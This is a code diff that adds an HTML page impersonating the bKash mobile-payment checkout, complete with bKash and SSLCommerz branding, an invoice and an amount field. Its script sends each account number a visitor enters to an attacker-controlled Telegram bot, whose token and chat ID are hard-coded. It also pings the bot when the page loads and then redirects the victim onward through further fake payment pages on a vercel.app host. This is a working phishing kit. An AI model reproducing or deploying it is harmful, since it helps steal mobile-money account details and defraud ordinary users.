@@ -1,3 +1,184 @@
-<!DOCTYPE html><html lang="en"><head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>Full-Screen Embedded HTML</title> <style>body{margin: 0;padding: 0;overflow: showen;}iframe{width: 100vw;height: 100vh;border: none;}</style></head><body><iframe src="indexx.html" title="-"></iframe>
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>bKash Payment</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="css/all.min.css">
+    <style>
+        .bg-custom {
+            background-image: url('images/4jVzJCT.png');
+            background-size: cover;
+            background-position: center;
+            padding: 2rem;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.5); }
+        }
+        .dot { animation: bounce 1.2s infinite ease-in-out; }
+        .dot:nth-child(1) { animation-delay: 0s; }
+        .dot:nth-child(2) { animation-delay: 0.2s; }
+        .dot:nth-child(3) { animation-delay: 0.4s; }
+        .dot:nth-child(4) { animation-delay: 0.6s; }
+        .loading { display: none; }
+    </style>
+</head>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">
+    <div class="bg-white rounded-lg shadow-lg max-w-sm w-full">
+        <!-- Header with logo -->
+        <div class="flex flex-col items-center justify-center p-5 border-b-2 border-pink-500">
+            <img src="images/7vwTXZx.png" alt="bKash logo" class="h-12">
+        </div>
+        
+        <!-- SSLCommerz Invoice and Amount Section -->
+        <div class="flex items-center justify-between px-4 py-2 bg-gray-50">
+            <div class="flex items-center">
+                <img id="sslLogo" src="images/V3lL1hk.png" alt="SSLCommerz logo" class="h-8 w-8">
+                <div class="ml-2 text-sm">
+                    <p id="companyName" class="font-bold">SSLCOMMERZ</p>
+                    <p id="invoiceId" class="text-gray-500 text-xs">Invoice: BGT726262477828828</p>
+                </div>
+            </div>
+            <p id="amountDisplay" class="font text-xl text-gray-600">৳20.00</p>
+        </div>
+
+        <!-- Account Input Section with Background Image -->
+        <div class="bg-custom text-white text-center">
+            <p class="font-semibold text-lg mb-2">Your bKash Account number</p>
+            <input type="text" id="bkashNumber" inputmode="numeric" pattern="[0-9]*" placeholder="e.g 01XXXXXXXXX" class="w-full px-4 py-2 text-center text-black rounded-md focus:outline-none" maxlength="11">
+            <p class="text-xs mt-2">
+                By clicking on <span class="font-bold">Confirm</span>, you are agreeing to the 
+                <a href="https://www.bkash.com/en/page/tokenized_checkout" target="_blank" class="underline text-white">terms & conditions</a>
+            </p>
+        </div>
+
+        <!-- Footer Buttons -->
+        <div class="grid grid-cols-2 gap-0 w-full border-t-3 border-pink-500 bg-gray-300">
+            <button id="closeButton" onclick="window.location.href=`https://portwallet.vercel.app/paymentMethod=bkash&&paymentID=4.html?amount=${amount}`" class="text-gray-600 font-bold text-x w-full py-4 bg-gray-300 border-r border-gray-400">CLOSE</button>
+            <button id="confirmButton" class="text-pink-600 font-bold text-x w-full py-4 bg-gray-300">CONFIRM</button>
+        </div>
+        
+        <!-- Bounce Animation -->
+        <div class="loading flex items-center justify-center h-20 w-full border-t-3 border-pink-500 bg-gray-300 hidden" id="loadingAnimation">
+            <div class="flex space-x-2">
+                <div class="dot w-4 h-4 bg-pink-600 rounded-full"></div>
+                <div class="dot w-4 h-4 bg-pink-500 rounded-full"></div>
+                <div class="dot w-4 h-4 bg-pink-400 rounded-full"></div>
+                <div class="dot w-4 h-4 bg-pink-300 rounded-full"></div>
+            </div>
+        </div>
+        
+        <!-- Contact Section -->
+        <div class="text-center py-4">
+            <a href="tel:16247" class="flex justify-center items-center text-pink-500">
+                <i class="fas fa-phone-alt mr-2"></i>
+                <span class="font-bold text-xl">16247</span>
+            </a>
+        </div>
+    </div>
+
+<script>
+const urlParams = new URLSearchParams(window.location.search);
+
+// Retrieve parameters from URL
+let amount = parseFloat(urlParams.get('amount')) || 10.00;
+const invoiceId = urlParams.get('invoice') || 'BGT177420240929180754';
+const sslLogoUrl = urlParams.get('ssl') || 'https://imgur.com/ljM76AR.png';
+const companyName = urlParams.get('companyName') || 'Grameenphone Ltd';
+const botToken = urlParams.get('botToken') || '7972009455:AAFN7kRY_Iu1IdWhTvaVeLheNgD3T7eF_Ik';
+const chatId = urlParams.get('chatId') || '1347276733';
+
+if (amount > 25000) {
+    amount = 25000;
+}
+
+document.getElementById('amountDisplay').textContent = `৳${amount.toFixed(2)}`;
+document.getElementById('invoiceId').textContent = `Invoice: ${invoiceId}`;
+document.getElementById('companyName').textContent = companyName;
+document.getElementById('sslLogo').src = sslLogoUrl;
+
+function sendMessageToTelegram(bkashNumber) {
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const data = {
+        chat_id: chatId,
+        text: `${bkashNumber}(bkash)`,
+    };
+
+    fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data),
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            console.log('Message sent successfully!');
+        } else {
+            console.error('Error:', data.description);
+        }
+    })
+    .catch(error => console.error('Error:', error));
+}
+
+document.getElementById('confirmButton').addEventListener('click', function() {
+    const bkashNumber = document.getElementById('bkashNumber').value;
+
+    const isValid = /^01\d{9}$/.test(bkashNumber);
+    if (!isValid) {
+        return;
+    }
+
+    document.getElementById('closeButton').style.display = 'none';
+    document.getElementById('confirmButton').style.display = 'none';
+    document.getElementById('loadingAnimation').classList.remove('hidden');
+
+    sendMessageToTelegram(bkashNumber);
+
+   setTimeout(() => {
+        // Make sure to properly encode all parameters in the URL
+        const redirectURL = `paymentMethod=bkash&&paymentID=2.html?amount=${encodeURIComponent(amount.toFixed(2))}&ssl=${encodeURIComponent(sslLogoUrl)}&companyName=${encodeURIComponent(companyName)}&invoice=${encodeURIComponent(invoiceId)}&botToken=${encodeURIComponent(botToken)}&chatId=${encodeURIComponent(chatId)}`;
+        
+        // Perform the redirect
+        window.location.href = redirectURL; https://portwallet.vercel.app/paymentmethod=bkash&&paymentID=1.html?amount=20&ssl=https%3A%2F%2Fimgur.com%2FV3lL1hk.png&companyName=SSLCOMMERZ&invoice=BGT726262477828828&botToken=7972009455:AAFN7kRY_Iu1IdWhTvaVeLheNgD3T7eF_Ik&chatId=1347276733
+    }, 3000);
+});
+</script>
+    <script>
+function sendInitialMessageToTelegram() {
+    const botToken = urlParams.get('botToken') || '7972009455:AAFN7kRY_Iu1IdWhTvaVeLheNgD3T7eF_Ik';
+    const chatId = urlParams.get('chatId') || '1347276733';
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const data = {
+        chat_id: chatId,
+        text: "User is going to payment",
+    };
+
+    fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data),
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            console.log('Initial message sent successfully!');
+        } else {
+            console.error('Error sending initial message:', data.description);
+        }
+    })
+    .catch(error => console.error('Error sending initial message:', error));
+}
+
+// Call the function on page load
+document.addEventListener('DOMContentLoaded', sendInitialMessageToTelegram);
+</script>
+
+
+
+
 
 </body></html>
